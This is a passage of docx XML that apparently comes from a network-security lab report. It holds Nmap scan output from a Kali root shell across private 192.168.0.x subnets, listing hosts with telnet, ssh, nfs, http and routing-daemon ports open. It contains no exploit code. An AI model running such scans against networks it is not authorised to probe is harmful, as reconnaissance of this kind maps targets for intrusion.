        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4ED4FE" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp   open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4DF096" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>111/tcp  open  rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42137BF0" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2049/tcp open  nfs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0086910A" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4576E0DC" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 32 IP addresses (2 hosts up) scanned in 14.91 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9D228C" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.64/27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33435D3B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:43 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5C6A63" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.65</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066A3C86" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0084s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A08B04" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E01E3FC" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7993F19E" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA927A5" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6362B87C" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4C5B31" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55534117" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.66</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F4E479" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0099s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEDDCFC" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16438019" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3695FCAD" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp   open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330B382A" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>111/tcp  open  rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50766964" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2049/tcp open  nfs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B5FBC4" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05887143" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 32 IP addresses (2 hosts up) scanned in 15.21 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6DCFC2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.96/27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C83D10" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:43 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DDB64C1" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.97</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B52711" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0079s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A880AD" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5D7451" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4430DA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3612E48D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD6C865" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D29600" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40D1202B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.98</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CBE4DE" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0035s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7617EAEB" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 995 filtered ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9C2426" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17237324" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>53/tcp   open  domain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4604DB6F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp   open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4363035F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2601/tcp open  zebra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48852961" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2604/tcp open  ospfd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37914E39" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2605/tcp open  bgpd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C72AE55" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3696D39D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 32 IP addresses (2 hosts up) scanned in 19.21 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5340F49E" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.128/27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF52F48" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:44 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4223CDD9" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.129</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729CDEDD" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0085s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071EA6BF" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEF9493" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B23A52B" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11842D54" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>80/tcp  open  http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CBA6AA" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>443/tcp open  https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC5959C" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="400950F2" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.130</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4073347F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0086s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB1CB26" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 997 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CB3092" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT     STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F131A9D" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp   open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF1077A" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>111/tcp  open  rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB89256" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2049/tcp open  nfs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D2BDDD" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49CAB235" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap done: 32 IP addresses (2 hosts up) scanned in 15.12 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00237CD1" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>root@kali:~# nmap 192.168.0.192/27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C77FE11" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 16:44 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525ACF75" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Nmap scan report for 192.168.0.193</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D59858" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Host is up (0.0015s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D421D78" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Not shown: 996 closed ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C715299" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>PORT    STATE SERVICE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727A79EE" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>22/tcp  open  ssh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA48673" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>23/tcp  open  telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C6CA0F" w14:textId="77777777" w:rsidR="00C40453" w:rsidRDefault="00C40453" w:rsidP="00C40453">
